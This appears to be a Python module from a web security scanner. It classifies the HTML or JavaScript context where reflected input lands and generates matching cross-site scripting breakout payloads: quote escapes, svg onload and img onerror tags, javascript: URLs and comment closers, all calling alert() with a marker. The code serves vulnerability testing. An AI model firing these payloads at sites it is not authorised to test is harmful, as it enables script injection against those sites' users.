"""SV1 - injection context analysis.

A reflection is not a vulnerability. What matters is the grammar around it:
inside a tag, a quoted attribute, a JS string, a comment, plain text. Read the
grammar, then build one payload that closes exactly what is open.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

TAG_RE = re.compile(r"<\s*([a-zA-Z][a-zA-Z0-9:-]*)")
ATTR_RE = re.compile(r"([^\s=<>/]+)\s*=\s*[^=\s<>]*$")
URL_ATTRS = ("href", "src", "action", "formaction", "data", "poster", "cite")


@dataclass(frozen=True)
class Site:
    kind: str               # text | attr | script | comment
    tag: str = ""
    attr: str = ""
    quote: str = ""         # html quote that is currently open
    js_quote: str = ""      # js string that is currently open

    def summary(self) -> str:
        if self.kind == "attr":
            quote = {"'": "single", '"': "double", "": "bare"}.get(self.quote, self.quote)
            return f"inside <{self.tag or '?'}> attribute {self.attr or '?'} ({quote} quoted)"
        if self.kind == "script":
            quote = {"'": "single", '"': "double", "`": "template", "": "code"}.get(
                self.js_quote, self.js_quote
            )
            return f"inside a <script> block ({quote})"
        if self.kind == "comment":
            return "inside an HTML comment"
        return "in HTML text flow"


def _html_quote_state(src: str) -> str:
    quote = ""
    index = 0
    while index < len(src):
        char = src[index]
        if quote:
            if char == quote:
                quote = ""
        elif char in "\"'":
            quote = char
        index += 1
    return quote


def _js_quote_state(src: str) -> str:
    quote = ""
    line_comment = False
    block_comment = False
    index = 0
    while index < len(src):
        char = src[index]
        if line_comment:
            if char == "\n":
                line_comment = False
        elif block_comment:
            if src.startswith("*/", index):
                block_comment = False
                index += 2
                continue
        elif quote:
            if char == "\\":
                index += 2
                continue
            if char == quote:
                quote = ""
        else:
            if src.startswith("//", index):
                line_comment = True
                index += 2
                continue
            if src.startswith("/*", index):
                block_comment = True
                index += 2
                continue
            if char in "\"'`":
                quote = char
        index += 1
    return quote


def analyze(text: str, index: int) -> Site:
    """Classify the exact spot where our token landed."""
    head = text[:index]
    lowered = head.lower()

    if lowered.rfind("<!--") > lowered.rfind("-->"):
        return Site("comment")

    if lowered.count("<script") > lowered.count("</script"):
        start = lowered.rfind("<script")
        return Site("script", tag="script", js_quote=_js_quote_state(text[start:index]))

    tag_start = head.rfind("<")
    tag_end = head.rfind(">")
    if tag_start > tag_end:
        tag_src = text[tag_start:index]
        match = TAG_RE.match(tag_src)
        tag = match.group(1).lower() if match else ""
        quote = _html_quote_state(tag_src[match.end():] if match else tag_src[1:])
        attr_match = ATTR_RE.search(tag_src)
        attr = attr_match.group(1).lower() if attr_match else ""
        return Site("attr", tag=tag, attr=attr, quote=quote)

    return Site("text")


def payloads(site: Site, token: str) -> list[str]:
    """Ordered candidates, context first, no duplicates."""
    call = f"alert('{token}')"
    out: list[str] = []

    if site.kind == "script":
        if site.js_quote == "'":
            out.append(f"{token}';{call}//")
        elif site.js_quote == '"':
            out.append(f'{token}";{call}//')
        elif site.js_quote == "`":
            out.append(f"{token}`;{call}//")
        else:
            out.append(f"{token};{call}//")
        out.append(f"{token}</script><svg/onload={call}>")
        out.append(f"{token}'-{call}-'")

    elif site.kind == "attr":
        if site.attr in URL_ATTRS:
            out.append(f"javascript:{call}")
        if site.quote:
            out.append(f"{token}{site.quote}><svg/onload={call}>")
            out.append(f'{token}{site.quote} onmouseover={site.quote}{call}')
        else:
            out.append(f"{token} onmouseover={call} x=")
            out.append(f"{token}><svg/onload={call}>")
        out.append(f"{token}><img src=x onerror={call}>")

    elif site.kind == "comment":
        out.append(f"{token}--><svg/onload={call}>")

    else:
        out.append(f"<svg/onload={call}>{token}")
        out.append(f"<img src=x onerror={call}>{token}")
        out.append(f"<script>{call}</script>{token}")

    return _unique(out)


def _unique(values: list[str]) -> list[str]:
    seen: set[str] = set()
    ordered: list[str] = []
    for value in values:
        if value in seen:
            continue
        seen.add(value)
        ordered.append(value)
    return ordered
